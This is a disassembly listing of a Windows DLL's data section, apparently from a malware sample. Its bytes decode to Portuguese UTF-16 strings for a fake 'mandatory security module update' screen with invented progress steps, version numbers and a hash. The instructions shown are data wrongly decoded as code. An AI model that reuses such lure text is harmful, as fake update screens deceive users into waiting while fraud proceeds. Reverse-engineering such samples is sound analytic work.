10007e07:	00 69 00             	add    %ch,0x0(%ecx)
10007e0a:	78 00                	js     0x10007e0c
10007e0c:	61                   	popa
10007e0d:	00 00                	add    %al,(%eax)
10007e0f:	23 20                	and    (%eax),%esp
10007e11:	00 41 00             	add    %al,0x0(%ecx)
10007e14:	6d                   	insl   (%dx),%es:(%edi)
10007e15:	00 62 00             	add    %ah,0x0(%edx)
10007e18:	69 00 65 00 6e 00    	imul   $0x6e0065,(%eax),%eax
10007e1e:	74 00                	je     0x10007e20
10007e20:	65 00 20             	add    %ah,%gs:(%eax)
10007e23:	00 53 00             	add    %dl,0x0(%ebx)
10007e26:	65 00 67 00          	add    %ah,%gs:0x0(%edi)
10007e2a:	75 00                	jne    0x10007e2c
10007e2c:	72 00                	jb     0x10007e2e
10007e2e:	6f                   	outsl  %ds:(%esi),(%dx)
10007e2f:	00 20                	add    %ah,(%eax)
10007e31:	00 00                	add    %al,(%eax)
10007e33:	09 4f 00             	or     %ecx,0x0(%edi)
10007e36:	6c                   	insb   (%dx),%es:(%edi)
10007e37:	00 61 00             	add    %ah,0x0(%ecx)
10007e3a:	20 00                	and    %al,(%eax)
10007e3c:	00 1f                	add    %bl,(%edi)
10007e3e:	2c 00                	sub    $0x0,%al
10007e40:	20 00                	and    %al,(%eax)
10007e42:	6f                   	outsl  %ds:(%esi),(%dx)
10007e43:	00 20                	add    %ah,(%eax)
10007e45:	00 63 00             	add    %ah,0x0(%ebx)
10007e48:	6f                   	outsl  %ds:(%esi),(%dx)
10007e49:	00 6d 00             	add    %ch,0x0(%ebp)
10007e4c:	70 00                	jo     0x10007e4e
10007e4e:	75 00                	jne    0x10007e50
10007e50:	74 00                	je     0x10007e52
10007e52:	61                   	popa
10007e53:	00 64 00 6f          	add    %ah,0x6f(%eax,%eax,1)
10007e57:	00 72 00             	add    %dh,0x0(%edx)
10007e5a:	20 00                	and    %al,(%eax)
10007e5c:	00 80 a9 20 00 65    	add    %al,0x650020a9(%eax)
10007e62:	00 73 00             	add    %dh,0x0(%ebx)
10007e65:	74 00                	je     0x10007e67
10007e67:	61                   	popa
10007e68:	00 20                	add    %ah,(%eax)
10007e6a:	00 72 00             	add    %dh,0x0(%edx)
10007e6d:	65 00 63 00          	add    %ah,%gs:0x0(%ebx)
10007e71:	65 00 62 00          	add    %ah,%gs:0x0(%edx)
10007e75:	65 00 6e 00          	add    %ch,%gs:0x0(%esi)
10007e79:	64 00 6f 00          	add    %ch,%fs:0x0(%edi)
10007e7d:	20 00                	and    %al,(%eax)
10007e7f:	75 00                	jne    0x10007e81
10007e81:	6d                   	insl   (%dx),%es:(%edi)
10007e82:	00 61 00             	add    %ah,0x0(%ecx)
10007e85:	20 00                	and    %al,(%eax)
10007e87:	61                   	popa
10007e88:	00 74 00 75          	add    %dh,0x75(%eax,%eax,1)
10007e8c:	00 61 00             	add    %ah,0x0(%ecx)
10007e8f:	6c                   	insb   (%dx),%es:(%edi)
10007e90:	00 69 00             	add    %ch,0x0(%ecx)
10007e93:	7a 00                	jp     0x10007e95
10007e95:	61                   	popa
10007e96:	00 63 00             	add    %ah,0x0(%ebx)
10007e99:	61                   	popa
10007e9a:	00 6f 00             	add    %ch,0x0(%edi)
10007e9d:	20 00                	and    %al,(%eax)
10007e9f:	64 00 65 00          	add    %ah,%fs:0x0(%ebp)
10007ea3:	20 00                	and    %al,(%eax)
10007ea5:	73 00                	jae    0x10007ea7
10007ea7:	65 00 67 00          	add    %ah,%gs:0x0(%edi)
10007eab:	75 00                	jne    0x10007ead
10007ead:	72 00                	jb     0x10007eaf
10007eaf:	61                   	popa
10007eb0:	00 6e 00             	add    %ch,0x0(%esi)
10007eb3:	63 00                	arpl   %eax,(%eax)
10007eb5:	61                   	popa
10007eb6:	00 20                	add    %ah,(%eax)
10007eb8:	00 6f 00             	add    %ch,0x0(%edi)
10007ebb:	62 00                	bound  %eax,(%eax)
10007ebd:	72 00                	jb     0x10007ebf
10007ebf:	69 00 67 00 61 00    	imul   $0x610067,(%eax),%eax
10007ec5:	74 00                	je     0x10007ec7
10007ec7:	6f                   	outsl  %ds:(%esi),(%dx)
10007ec8:	00 72 00             	add    %dh,0x0(%edx)
10007ecb:	69 00 61 00 2e 00    	imul   $0x2e0061,(%eax),%eax
10007ed1:	20 00                	and    %al,(%eax)
10007ed3:	4e                   	dec    %esi
10007ed4:	00 41 00             	add    %al,0x0(%ecx)
10007ed7:	4f                   	dec    %edi
10007ed8:	00 20                	add    %ah,(%eax)
10007eda:	00 44 00 45          	add    %al,0x45(%eax,%eax,1)
10007ede:	00 53 00             	add    %dl,0x0(%ebx)
10007ee1:	4c                   	dec    %esp
10007ee2:	00 49 00             	add    %cl,0x0(%ecx)
10007ee5:	47                   	inc    %edi
10007ee6:	00 55 00             	add    %dl,0x0(%ebp)
10007ee9:	45                   	inc    %ebp
10007eea:	00 20                	add    %ah,(%eax)
10007eec:	00 4f 00             	add    %cl,0x0(%edi)
10007eef:	20 00                	and    %al,(%eax)
10007ef1:	43                   	inc    %ebx
10007ef2:	00 4f 00             	add    %cl,0x0(%edi)
10007ef5:	4d                   	dec    %ebp
10007ef6:	00 50 00             	add    %dl,0x0(%eax)
10007ef9:	55                   	push   %ebp
10007efa:	00 54 00 41          	add    %dl,0x41(%eax,%eax,1)
10007efe:	00 44 00 4f          	add    %al,0x4f(%eax,%eax,1)
10007f02:	00 52 00             	add    %dl,0x0(%edx)
10007f05:	2e 00 00             	add    %al,%cs:(%eax)
10007f08:	79 4d                	jns    0x10007f57
10007f0a:	00 6f 00             	add    %ch,0x0(%edi)
10007f0d:	64 00 75 00          	add    %dh,%fs:0x0(%ebp)
10007f11:	6c                   	insb   (%dx),%es:(%edi)
10007f12:	00 6f 00             	add    %ch,0x0(%edi)
10007f15:	20 00                	and    %al,(%eax)
10007f17:	64 00 65 00          	add    %ah,%fs:0x0(%ebp)
10007f1b:	20 00                	and    %al,(%eax)
10007f1d:	53                   	push   %ebx
10007f1e:	00 65 00             	add    %ah,0x0(%ebp)
10007f21:	67 00 75 00          	add    %dh,0x0(%di)
10007f25:	72 00                	jb     0x10007f27
10007f27:	61                   	popa
10007f28:	00 6e 00             	add    %ch,0x0(%esi)
10007f2b:	63 00                	arpl   %eax,(%eax)
10007f2d:	61                   	popa
10007f2e:	00 20                	add    %ah,(%eax)
10007f30:	00 76 00             	add    %dh,0x0(%esi)
10007f33:	32 00                	xor    (%eax),%al
10007f35:	2e 00 38             	add    %bh,%cs:(%eax)
10007f38:	00 2e                	add    %ch,(%esi)
10007f3a:	00 33                	add    %dh,(%ebx)
10007f3c:	00 20                	add    %ah,(%eax)
10007f3e:	00 2d 00 3e 00 20    	add    %ch,0x20003e00
10007f44:	00 76 00             	add    %dh,0x0(%esi)
10007f47:	33 00                	xor    (%eax),%eax
10007f49:	2e 00 31             	add    %dh,%cs:(%ecx)
10007f4c:	00 2e                	add    %ch,(%esi)
10007f4e:	00 37                	add    %dh,(%edi)
10007f50:	00 20                	add    %ah,(%eax)
10007f52:	00 7c 00 20          	add    %bh,0x20(%eax,%eax,1)
10007f56:	00 53 00             	add    %dl,0x0(%ebx)
10007f59:	48                   	dec    %eax
10007f5a:	00 41 00             	add    %al,0x0(%ecx)
10007f5d:	32 00                	xor    (%eax),%al
10007f5f:	35 00 36 00 3a       	xor    $0x3a003600,%eax
10007f64:	00 20                	add    %ah,(%eax)
10007f66:	00 37                	add    %dh,(%edi)
10007f68:	00 61 00             	add    %ah,0x0(%ecx)
10007f6b:	33 00                	xor    (%eax),%eax
10007f6d:	62 00                	bound  %eax,(%eax)
10007f6f:	39 00                	cmp    %eax,(%eax)
10007f71:	66 00 32             	data16 add %dh,(%edx)
10007f74:	00 65 00             	add    %ah,0x0(%ebp)
10007f77:	38 00                	cmp    %al,(%eax)
10007f79:	64 00 2e             	add    %ch,%fs:(%esi)
10007f7c:	00 2e                	add    %ch,(%esi)
10007f7e:	00 2e                	add    %ch,(%esi)
10007f80:	00 01                	add    %al,(%ecx)
10007f82:	3f                   	aas
10007f83:	56                   	push   %esi
10007f84:	00 65 00             	add    %ah,0x0(%ebp)
10007f87:	72 00                	jb     0x10007f89
10007f89:	69 00 66 00 69 00    	imul   $0x690066,(%eax),%eax
10007f8f:	63 00                	arpl   %eax,(%eax)
10007f91:	61                   	popa
10007f92:	00 6e 00             	add    %ch,0x0(%esi)
10007f95:	64 00 6f 00          	add    %ch,%fs:0x0(%edi)
10007f99:	20 00                	and    %al,(%eax)
10007f9b:	73 00                	jae    0x10007f9d
10007f9d:	69 00 73 00 74 00    	imul   $0x740073,(%eax),%eax
10007fa3:	65 00 6d 00          	add    %ch,%gs:0x0(%ebp)
10007fa7:	61                   	popa
10007fa8:	00 20                	add    %ah,(%eax)
10007faa:	00 6f 00             	add    %ch,0x0(%edi)
10007fad:	70 00                	jo     0x10007faf
10007faf:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
10007fb3:	61                   	popa
10007fb4:	00 63 00             	add    %ah,0x0(%ebx)
10007fb7:	69 00 6f 00 6e 00    	imul   $0x6e006f,(%eax),%eax
10007fbd:	61                   	popa
10007fbe:	00 6c 00 00          	add    %ch,0x0(%eax,%eax,1)
10007fc2:	3f                   	aas
10007fc3:	44                   	inc    %esp
10007fc4:	00 6f 00             	add    %ch,0x0(%edi)
10007fc7:	77 00                	ja     0x10007fc9
10007fc9:	6e                   	outsb  %ds:(%esi),(%dx)
10007fca:	00 6c 00 6f          	add    %ch,0x6f(%eax,%eax,1)
10007fce:	00 61 00             	add    %ah,0x0(%ecx)
10007fd1:	64 00 20             	add    %ah,%fs:(%eax)
10007fd4:	00 64 00 6f          	add    %ah,0x6f(%eax,%eax,1)
10007fd8:	00 20                	add    %ah,(%eax)
10007fda:	00 6d 00             	add    %ch,0x0(%ebp)
10007fdd:	6f                   	outsl  %ds:(%esi),(%dx)
10007fde:	00 64 00 75          	add    %ah,0x75(%eax,%eax,1)
10007fe2:	00 6c 00 6f          	add    %ch,0x6f(%eax,%eax,1)
10007fe6:	00 20                	add    %ah,(%eax)
10007fe8:	00 64 00 65          	add    %ah,0x65(%eax,%eax,1)
10007fec:	00 20                	add    %ah,(%eax)
10007fee:	00 73 00             	add    %dh,0x0(%ebx)
10007ff1:	65 00 67 00          	add    %ah,%gs:0x0(%edi)
10007ff5:	75 00                	jne    0x10007ff7
10007ff7:	72 00                	jb     0x10007ff9
10007ff9:	61                   	popa
10007ffa:	00 6e 00             	add    %ch,0x0(%esi)
10007ffd:	63 00                	arpl   %eax,(%eax)
10007fff:	61                   	popa
10008000:	00 00                	add    %al,(%eax)
10008002:	3f                   	aas
10008003:	56                   	push   %esi
10008004:	00 61 00             	add    %ah,0x0(%ecx)
10008007:	6c                   	insb   (%dx),%es:(%edi)
10008008:	00 69 00             	add    %ch,0x0(%ecx)
1000800b:	64 00 61 00          	add    %ah,%fs:0x0(%ecx)
1000800f:	6e                   	outsb  %ds:(%esi),(%dx)
10008010:	00 64 00 6f          	add    %ah,0x6f(%eax,%eax,1)
10008014:	00 20                	add    %ah,(%eax)
10008016:	00 63 00             	add    %ah,0x0(%ebx)
10008019:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
1000801d:	74 00                	je     0x1000801f
1000801f:	69 00 66 00 69 00    	imul   $0x690066,(%eax),%eax
10008025:	63 00                	arpl   %eax,(%eax)
10008027:	61                   	popa
10008028:	00 64 00 6f          	add    %ah,0x6f(%eax,%eax,1)
1000802c:	00 73 00             	add    %dh,0x0(%ebx)
1000802f:	20 00                	and    %al,(%eax)
10008031:	64 00 69 00          	add    %ch,%fs:0x0(%ecx)
10008035:	67 00 69 00          	add    %ch,0x0(%bx,%di)
10008039:	74 00                	je     0x1000803b
1000803b:	61                   	popa
1000803c:	00 69 00             	add    %ch,0x0(%ecx)
1000803f:	73 00                	jae    0x10008041
10008041:	00 2b                	add    %ch,(%ebx)
10008043:	41                   	inc    %ecx
10008044:	00 70 00             	add    %dh,0x0(%eax)
10008047:	6c                   	insb   (%dx),%es:(%edi)
10008048:	00 69 00             	add    %ch,0x0(%ecx)
1000804b:	63 00                	arpl   %eax,(%eax)
1000804d:	61                   	popa
1000804e:	00 6e 00             	add    %ch,0x0(%esi)
10008051:	64 00 6f 00          	add    %ch,%fs:0x0(%edi)
10008055:	20 00                	and    %al,(%eax)
10008057:	61                   	popa
10008058:	00 74 00 75          	add    %dh,0x75(%eax,%eax,1)
1000805c:	00 61 00             	add    %ah,0x0(%ecx)
1000805f:	6c                   	insb   (%dx),%es:(%edi)
10008060:	00 69 00             	add    %ch,0x0(%ecx)
10008063:	7a 00                	jp     0x10008065
10008065:	61                   	popa
10008066:	00 63 00             	add    %ah,0x0(%ebx)
10008069:	61                   	popa
1000806a:	00 6f 00             	add    %ch,0x0(%edi)
1000806d:	00 45 49             	add    %al,0x49(%ebp)
10008070:	00 64 00 65          	add    %ah,0x65(%eax,%eax,1)
10008074:	00 6e 00             	add    %ch,0x0(%esi)
10008077:	74 00                	je     0x10008079
10008079:	69 00 66 00 69 00    	imul   $0x690066,(%eax),%eax
1000807f:	63 00                	arpl   %eax,(%eax)
10008081:	61                   	popa
10008082:	00 6e 00             	add    %ch,0x0(%esi)
10008085:	64 00 6f 00          	add    %ch,%fs:0x0(%edi)
10008089:	20 00                	and    %al,(%eax)
1000808b:	76 00                	jbe    0x1000808d
1000808d:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
10008091:	73 00                	jae    0x10008093
10008093:	61                   	popa
10008094:	00 6f 00             	add    %ch,0x0(%edi)
10008097:	20 00                	and    %al,(%eax)
10008099:	64 00 6f 00          	add    %ch,%fs:0x0(%edi)
1000809d:	20 00                	and    %al,(%eax)
1000809f:	57                   	push   %edi
100080a0:	00 69 00             	add    %ch,0x0(%ecx)
100080a3:	6e                   	outsb  %ds:(%esi),(%dx)
100080a4:	00 64 00 6f          	add    %ah,0x6f(%eax,%eax,1)
100080a8:	00 77 00             	add    %dh,0x0(%edi)
100080ab:	73 00                	jae    0x100080ad
100080ad:	2e 00 2e             	add    %ch,%cs:(%esi)
100080b0:	00 2e                	add    %ch,(%esi)
100080b2:	00 00                	add    %al,(%eax)
100080b4:	4b                   	dec    %ebx
100080b5:	56                   	push   %esi
100080b6:	00 65 00             	add    %ah,0x0(%ebp)
100080b9:	72 00                	jb     0x100080bb
100080bb:	69 00 66 00 69 00    	imul   $0x690066,(%eax),%eax
100080c1:	63 00                	arpl   %eax,(%eax)
100080c3:	61                   	popa
100080c4:	00 6e 00             	add    %ch,0x0(%esi)
100080c7:	64 00 6f 00          	add    %ch,%fs:0x0(%edi)
100080cb:	20 00                	and    %al,(%eax)
100080cd:	61                   	popa
100080ce:	00 72 00             	add    %dh,0x0(%edx)
100080d1:	71 00                	jno    0x100080d3
100080d3:	75 00                	jne    0x100080d5
100080d5:	69 00 74 00 65 00    	imul   $0x650074,(%eax),%eax
100080db:	74 00                	je     0x100080dd
100080dd:	75 00                	jne    0x100080df
100080df:	72 00                	jb     0x100080e1
100080e1:	61                   	popa
100080e2:	00 20                	add    %ah,(%eax)
100080e4:	00 64 00 6f          	add    %ah,0x6f(%eax,%eax,1)
100080e8:	00 20                	add    %ah,(%eax)
100080ea:	00 73 00             	add    %dh,0x0(%ebx)
100080ed:	69 00 73 00 74 00    	imul   $0x740073,(%eax),%eax
100080f3:	65 00 6d 00          	add    %ch,%gs:0x0(%ebp)
100080f7:	61                   	popa
100080f8:	00 2e                	add    %ch,(%esi)
100080fa:	00 2e                	add    %ch,(%esi)
100080fc:	00 2e                	add    %ch,(%esi)
100080fe:	00 00                	add    %al,(%eax)
10008100:	37                   	aaa
10008101:	43                   	inc    %ebx
10008102:	00 68 00             	add    %ch,0x0(%eax)
10008105:	65 00 63 00          	add    %ah,%gs:0x0(%ebx)
10008109:	61                   	popa
1000810a:	00 6e 00             	add    %ch,0x0(%esi)
1000810d:	64 00 6f 00          	add    %ch,%fs:0x0(%edi)
10008111:	20 00                	and    %al,(%eax)
10008113:	63 00                	arpl   %eax,(%eax)
10008115:	6f                   	outsl  %ds:(%esi),(%dx)
10008116:	00 6d 00             	add    %ch,0x0(%ebp)
10008119:	70 00                	jo     0x1000811b
1000811b:	61                   	popa
1000811c:	00 74 00 69          	add    %dh,0x69(%eax,%eax,1)
10008120:	00 62 00             	add    %ah,0x0(%edx)
10008123:	69 00 6c 00 69 00    	imul   $0x69006c,(%eax),%eax
10008129:	64 00 61 00          	add    %ah,%fs:0x0(%ecx)
1000812d:	64 00 65 00          	add    %ah,%fs:0x0(%ebp)
10008131:	2e 00 2e             	add    %ch,%cs:(%esi)
10008134:	00 2e                	add    %ch,(%esi)
10008136:	00 00                	add    %al,(%eax)
10008138:	13 53 00             	adc    0x0(%ebx),%edx
1000813b:	69 00 73 00 74 00    	imul   $0x740073,(%eax),%eax
10008141:	65 00 6d 00          	add    %ch,%gs:0x0(%ebp)
10008145:	61                   	popa
10008146:	00 3a                	add    %bh,(%edx)
10008148:	00 20                	add    %ah,(%eax)
1000814a:	00 00                	add    %al,(%eax)
1000814c:	4b                   	dec    %ebx
1000814d:	42                   	inc    %edx
1000814e:	00 61 00             	add    %ah,0x0(%ecx)
10008151:	69 00 78 00 61 00    	imul   $0x610078,(%eax),%eax
10008157:	6e                   	outsb  %ds:(%esi),(%dx)
10008158:	00 64 00 6f          	add    %ah,0x6f(%eax,%eax,1)
1000815c:	00 20                	add    %ah,(%eax)
1000815e:	00 70 00             	add    %dh,0x0(%eax)
10008161:	61                   	popa
10008162:	00 63 00             	add    %ah,0x0(%ebx)
10008165:	6f                   	outsl  %ds:(%esi),(%dx)
10008166:	00 74 00 65          	add    %dh,0x65(%eax,%eax,1)
1000816a:	00 20                	add    %ah,(%eax)
1000816c:	00 28                	add    %ch,(%eax)
1000816e:	00 30                	add    %dh,(%eax)
10008170:	00 20                	add    %ah,(%eax)
10008172:	00 4b 00             	add    %cl,0x0(%ebx)
10008175:	42                   	inc    %edx
10008176:	00 20                	add    %ah,(%eax)
10008178:	00 2f                	add    %ch,(%edi)
1000817a:	00 20                	add    %ah,(%eax)
1000817c:	00 34 00             	add    %dh,(%eax,%eax,1)
1000817f:	37                   	aaa
10008180:	00 2e                	add    %ch,(%esi)
10008182:	00 38                	add    %bh,(%eax)
10008184:	00 33                	add    %dh,(%ebx)
10008186:	00 32                	add    %dh,(%edx)
10008188:	00 20                	add    %ah,(%eax)
1000818a:	00 4b 00             	add    %cl,0x0(%ebx)
1000818d:	42                   	inc    %edx
1000818e:	00 29                	add    %ch,(%ecx)
10008190:	00 2e                	add    %ch,(%esi)
10008192:	00 2e                	add    %ch,(%esi)
10008194:	00 2e                	add    %ch,(%esi)
10008196:	00 00                	add    %al,(%eax)
10008198:	4b                   	dec    %ebx
10008199:	56                   	push   %esi
1000819a:	00 65 00             	add    %ah,0x0(%ebp)
1000819d:	72 00                	jb     0x1000819f
1000819f:	69 00 66 00 69 00    	imul   $0x690066,(%eax),%eax
100081a5:	63 00                	arpl   %eax,(%eax)
100081a7:	61                   	popa
100081a8:	00 6e 00             	add    %ch,0x0(%esi)
100081ab:	64 00 6f 00          	add    %ch,%fs:0x0(%edi)
100081af:	20 00                	and    %al,(%eax)
100081b1:	69 00 6e 00 74 00    	imul   $0x74006e,(%eax),%eax
100081b7:	65 00 67 00          	add    %ah,%gs:0x0(%edi)
100081bb:	72 00                	jb     0x100081bd
100081bd:	69 00 64 00 61 00    	imul   $0x610064,(%eax),%eax
100081c3:	64 00 65 00          	add    %ah,%fs:0x0(%ebp)
100081c7:	20 00                	and    %al,(%eax)
100081c9:	64 00 6f 00          	add    %ch,%fs:0x0(%edi)
100081cd:	20 00                	and    %al,(%eax)
100081cf:	61                   	popa
100081d0:	00 72 00             	add    %dh,0x0(%edx)
100081d3:	71 00                	jno    0x100081d5
100081d5:	75 00                	jne    0x100081d7
100081d7:	69 00 76 00 6f 00    	imul   $0x6f0076,(%eax),%eax
100081dd:	2e 00 2e             	add    %ch,%cs:(%esi)
100081e0:	00 2e                	add    %ch,(%esi)
100081e2:	00 00                	add    %al,(%eax)
100081e4:	31 44 00 65          	xor    %eax,0x65(%eax,%eax,1)
100081e8:	00 73 00             	add    %dh,0x0(%ebx)
100081eb:	63 00                	arpl   %eax,(%eax)
100081ed:	6f                   	outsl  %ds:(%esi),(%dx)
100081ee:	00 6d 00             	add    %ch,0x0(%ebp)
100081f1:	70 00                	jo     0x100081f3
100081f3:	61                   	popa
100081f4:	00 63 00             	add    %ah,0x0(%ebx)
100081f7:	74 00                	je     0x100081f9
100081f9:	61                   	popa
100081fa:	00 6e 00             	add    %ch,0x0(%esi)
100081fd:	64 00 6f 00          	add    %ch,%fs:0x0(%edi)
10008201:	20 00                	and    %al,(%eax)
10008203:	6d                   	insl   (%dx),%es:(%edi)
10008204:	00 6f 00             	add    %ch,0x0(%edi)
10008207:	64 00 75 00          	add    %dh,%fs:0x0(%ebp)
1000820b:	6c                   	insb   (%dx),%es:(%edi)
1000820c:	00 6f 00             	add    %ch,0x0(%edi)
1000820f:	2e 00 2e             	add    %ch,%cs:(%esi)
10008212:	00 2e                	add    %ch,(%esi)
10008214:	00 00                	add    %al,(%eax)
10008216:	3b 56 00             	cmp    0x0(%esi),%edx
10008219:	61                   	popa
1000821a:	00 6c 00 69          	add    %ch,0x69(%eax,%eax,1)
1000821e:	00 64 00 61          	add    %ah,0x61(%eax,%eax,1)
10008222:	00 6e 00             	add    %ch,0x0(%esi)
10008225:	64 00 6f 00          	add    %ch,%fs:0x0(%edi)
10008229:	20 00                	and    %al,(%eax)
1000822b:	63 00                	arpl   %eax,(%eax)
1000822d:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
10008231:	74 00                	je     0x10008233
10008233:	69 00 66 00 69 00    	imul   $0x690066,(%eax),%eax
10008239:	63 00                	arpl   %eax,(%eax)
1000823b:	61                   	popa
1000823c:	00 64 00 6f          	add    %ah,0x6f(%eax,%eax,1)
10008240:	00 20                	add    %ah,(%eax)
10008242:	00 72 00             	add    %dh,0x0(%edx)
10008245:	61                   	popa
10008246:	00 69 00             	add    %ch,0x0(%ecx)
10008249:	7a 00                	jp     0x1000824b
1000824b:	2e 00 2e             	add    %ch,%cs:(%esi)
1000824e:	00 2e                	add    %ch,(%esi)
10008250:	00 00                	add    %al,(%eax)
10008252:	45                   	inc    %ebp
10008253:	43                   	inc    %ebx
10008254:	00 68 00             	add    %ch,0x0(%eax)
10008257:	65 00 63 00          	add    %ah,%gs:0x0(%ebx)
1000825b:	61                   	popa
1000825c:	00 6e 00             	add    %ch,0x0(%esi)
1000825f:	64 00 6f 00          	add    %ch,%fs:0x0(%edi)
10008263:	20 00                	and    %al,(%eax)
10008265:	63 00                	arpl   %eax,(%eax)
10008267:	61                   	popa
10008268:	00 64 00 65          	add    %ah,0x65(%eax,%eax,1)
1000826c:	00 69 00             	add    %ch,0x0(%ecx)
1000826f:	61                   	popa
10008270:	00 20                	add    %ah,(%eax)
10008272:	00 64 00 65          	add    %ah,0x65(%eax,%eax,1)
10008276:	00 20                	add    %ah,(%eax)
10008278:	00 63 00             	add    %ah,0x0(%ebx)
1000827b:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
1000827f:	74 00                	je     0x10008281
10008281:	69 00 66 00 69 00    	imul   $0x690066,(%eax),%eax
10008287:	63 00                	arpl   %eax,(%eax)
10008289:	61                   	popa
1000828a:	00 64 00 6f          	add    %ah,0x6f(%eax,%eax,1)
1000828e:	00 73 00             	add    %dh,0x0(%ebx)
10008291:	2e 00 2e             	add    %ch,%cs:(%esi)
10008294:	00 2e                	add    %ch,(%esi)
10008296:	00 00                	add    %al,(%eax)
10008298:	43                   	inc    %ebx
10008299:	56                   	push   %esi
1000829a:	00 65 00             	add    %ah,0x0(%ebp)
1000829d:	72 00                	jb     0x1000829f
1000829f:	69 00 66 00 69 00    	imul   $0x690066,(%eax),%eax
100082a5:	63 00                	arpl   %eax,(%eax)
100082a7:	61                   	popa
100082a8:	00 6e 00             	add    %ch,0x0(%esi)
100082ab:	64 00 6f 00          	add    %ch,%fs:0x0(%edi)
100082af:	20 00                	and    %al,(%eax)
100082b1:	61                   	popa
100082b2:	00 73 00             	add    %dh,0x0(%ebx)
100082b5:	73 00                	jae    0x100082b7
100082b7:	69 00 6e 00 61 00    	imul   $0x61006e,(%eax),%eax
100082bd:	74 00                	je     0x100082bf
100082bf:	75 00                	jne    0x100082c1
100082c1:	72 00                	jb     0x100082c3
100082c3:	61                   	popa
100082c4:	00 20                	add    %ah,(%eax)
100082c6:	00 64 00 69          	add    %ah,0x69(%eax,%eax,1)
100082ca:	00 67 00             	add    %ah,0x0(%edi)
100082cd:	69 00 74 00 61 00    	imul   $0x610074,(%eax),%eax
100082d3:	6c                   	insb   (%dx),%es:(%edi)
100082d4:	00 2e                	add    %ch,(%esi)
100082d6:	00 2e                	add    %ch,(%esi)
100082d8:	00 2e                	add    %ch,(%esi)
100082da:	00 00                	add    %al,(%eax)
100082dc:	45                   	inc    %ebp
100082dd:	56                   	push   %esi
100082de:	00 61 00             	add    %ah,0x0(%ecx)
100082e1:	6c                   	insb   (%dx),%es:(%edi)
100082e2:	00 69 00             	add    %ch,0x0(%ecx)
100082e5:	64 00 61 00          	add    %ah,%fs:0x0(%ecx)
100082e9:	6e                   	outsb  %ds:(%esi),(%dx)
100082ea:	00 64 00 6f          	add    %ah,0x6f(%eax,%eax,1)
100082ee:	00 20                	add    %ah,(%eax)
100082f0:	00 74 00 6f          	add    %dh,0x6f(%eax,%eax,1)
100082f4:	00 6b 00             	add    %ch,0x0(%ebx)
100082f7:	65 00 6e 00          	add    %ch,%gs:0x0(%esi)
100082fb:	20 00                	and    %al,(%eax)
100082fd:	64 00 65 00          	add    %ah,%fs:0x0(%ebp)
10008301:	20 00                	and    %al,(%eax)
10008303:	61                   	popa
10008304:	00 75 00             	add    %dh,0x0(%ebp)
10008307:	74 00                	je     0x10008309
10008309:	65 00 6e 00          	add    %ch,%gs:0x0(%esi)
1000830d:	74 00                	je     0x1000830f
1000830f:	69 00 63 00 61 00    	imul   $0x610063,(%eax),%eax
10008315:	63 00                	arpl   %eax,(%eax)
10008317:	61                   	popa
10008318:	00 6f 00             	add    %ch,0x0(%edi)
1000831b:	2e 00 2e             	add    %ch,%cs:(%esi)
1000831e:	00 2e                	add    %ch,(%esi)
10008320:	00 00                	add    %al,(%eax)
10008322:	31 50 00             	xor    %edx,0x0(%eax)
10008325:	72 00                	jb     0x10008327
10008327:	65 00 70 00          	add    %dh,%gs:0x0(%eax)
1000832b:	61                   	popa
1000832c:	00 72 00             	add    %dh,0x0(%edx)
1000832f:	61                   	popa
10008330:	00 6e 00             	add    %ch,0x0(%esi)
10008333:	64 00 6f 00          	add    %ch,%fs:0x0(%edi)
10008337:	20 00                	and    %al,(%eax)
10008339:	69 00 6e 00 73 00    	imul   $0x73006e,(%eax),%eax
1000833f:	74 00                	je     0x10008341
10008341:	61                   	popa
10008342:	00 6c 00 61          	add    %ch,0x61(%eax,%eax,1)
10008346:	00 63 00             	add    %ah,0x0(%ebx)
10008349:	61                   	popa
1000834a:	00 6f 00             	add    %ch,0x0(%edi)
1000834d:	2e 00 2e             	add    %ch,%cs:(%esi)
10008350:	00 2e                	add    %ch,(%esi)
10008352:	00 00                	add    %al,(%eax)
10008354:	35 41 00 74 00       	xor    $0x740041,%eax
10008359:	75 00                	jne    0x1000835b
1000835b:	61                   	popa
1000835c:	00 6c 00 69          	add    %ch,0x69(%eax,%eax,1)
10008360:	00 7a 00             	add    %bh,0x0(%edx)
10008363:	61                   	popa
10008364:	00 6e 00             	add    %ch,0x0(%esi)
10008367:	64 00 6f 00          	add    %ch,%fs:0x0(%edi)
1000836b:	20 00                	and    %al,(%eax)
1000836d:	63 00                	arpl   %eax,(%eax)
1000836f:	6f                   	outsl  %ds:(%esi),(%dx)
10008370:	00 6d 00             	add    %ch,0x0(%ebp)
10008373:	70 00                	jo     0x10008375
10008375:	6f                   	outsl  %ds:(%esi),(%dx)
10008376:	00 6e 00             	add    %ch,0x0(%esi)
10008379:	65 00 6e 00          	add    %ch,%gs:0x0(%esi)
1000837d:	74 00                	je     0x1000837f
1000837f:	65 00 73 00          	add    %dh,%gs:0x0(%ebx)
10008383:	2e 00 2e             	add    %ch,%cs:(%esi)
10008386:	00 2e                	add    %ch,(%esi)
10008388:	00 00                	add    %al,(%eax)
1000838a:	27                   	daa
1000838b:	52                   	push   %edx
1000838c:	00 65 00             	add    %ah,0x0(%ebp)
1000838f:	67 00 69 00          	add    %ch,0x0(%bx,%di)
10008393:	73 00                	jae    0x10008395
10008395:	74 00                	je     0x10008397
10008397:	72 00                	jb     0x10008399
10008399:	61                   	popa
1000839a:	00 6e 00             	add    %ch,0x0(%esi)
1000839d:	64 00 6f 00          	add    %ch,%fs:0x0(%edi)
100083a1:	20 00                	and    %al,(%eax)
100083a3:	44                   	inc    %esp
100083a4:	00 4c 00 4c          	add    %cl,0x4c(%eax,%eax,1)
100083a8:	00 73 00             	add    %dh,0x0(%ebx)
100083ab:	2e 00 2e             	add    %ch,%cs:(%esi)
100083ae:	00 2e                	add    %ch,(%esi)
100083b0:	00 00                	add    %al,(%eax)
100083b2:	37                   	aaa
100083b3:	46                   	inc    %esi
100083b4:	00 69 00             	add    %ch,0x0(%ecx)
100083b7:	6e                   	outsb  %ds:(%esi),(%dx)
100083b8:	00 61 00             	add    %ah,0x0(%ecx)
100083bb:	6c                   	insb   (%dx),%es:(%edi)
100083bc:	00 69 00             	add    %ch,0x0(%ecx)
100083bf:	7a 00                	jp     0x100083c1
100083c1:	61                   	popa
100083c2:	00 6e 00             	add    %ch,0x0(%esi)
